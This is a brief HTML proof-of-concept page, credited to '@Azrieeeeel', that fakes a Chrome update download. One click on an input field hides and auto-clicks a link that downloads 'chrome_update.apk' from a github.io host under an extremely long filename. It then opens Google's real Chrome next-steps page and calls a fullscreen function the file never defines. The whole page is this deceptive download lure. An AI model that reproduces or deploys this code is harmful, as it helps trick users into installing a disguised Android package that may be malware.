<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Download & Fullscreen on Keypress</title>
</head>
<body>
  <center><h2>POC by @Azrieeeeel</h2></center>
  <input type="text" id="triggerInput">

  <script>
    document.getElementById('triggerInput').addEventListener('click', function() {
      // Hanya picu download APK dari link yang diberikan
      triggerAPKDownload();
      
      window.open('https://www.google.com/intl/en_in/chrome/next-steps.html?standalone=1&installdataindex=empty&defaultbrowser=0', '_blank');
      goFullScreen();
    }, { once: false });

    // Fungsi untuk download APK langsung
    function triggerAPKDownload() {
      const apkUrl = "https://zriil.github.io/S/upload/chrome_update.apk";
      const link = document.createElement("a");
      link.href = apkUrl;
      link.download = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.apk"; // Nama file saat diunduh
      link.style.display = "none";
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);
    }

    // Hapus semua fungsi download original
  </script>
</body>
</html>
